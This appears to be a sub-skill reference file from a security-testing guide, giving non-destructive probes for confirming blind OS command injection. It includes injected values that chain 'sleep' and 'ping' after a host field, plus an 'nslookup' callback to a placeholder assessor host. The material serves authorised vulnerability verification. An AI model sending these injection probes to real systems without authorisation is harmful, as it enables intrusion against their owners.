# Diagnostic Verification Probes and Code Patterns

> Sub-skill: [`os-command-injection-blind-and-time-based`](SKILL.md) | Family: **Web and Application**

Non-destructive verification probes owned by `os-command-injection-blind-and-time-based`. Record a benign baseline first; every class below is chosen so the response differs only when the weakness is present.

## Verification Classes

### Bounded time-delay differential

**Expected differential:** elapsed time grows only for the sleep-bearing value and matches baseline otherwise, confirmed across repeated samples

```text
host=127.0.0.1 && sleep 6
host=127.0.0.1 && sleep 0
```

### DNS callback channel

**Expected differential:** a lookup of an assessor hostname arrives only for the injected value, confirming execution without any response body change

```text
host=127.0.0.1; nslookup probe.<assessor-controlled-host>
host=127.0.0.1
```

### Repeated-sample timing confirmation

**Expected differential:** a longer ping count scales the response time predictably against a single-count baseline, separating signal from jitter

```text
host=127.0.0.1 && ping -c 6 127.0.0.1
host=127.0.0.1 && ping -c 1 127.0.0.1
```

## Usage Rules

- Send one probe class at a time and keep the benign control request identical in every other respect.
- Stop at the first differential that proves the invariant is missing; do not escalate within the same request.
- Every confirmed class maps to the structural remediation in [`SKILL.md`](SKILL.md).
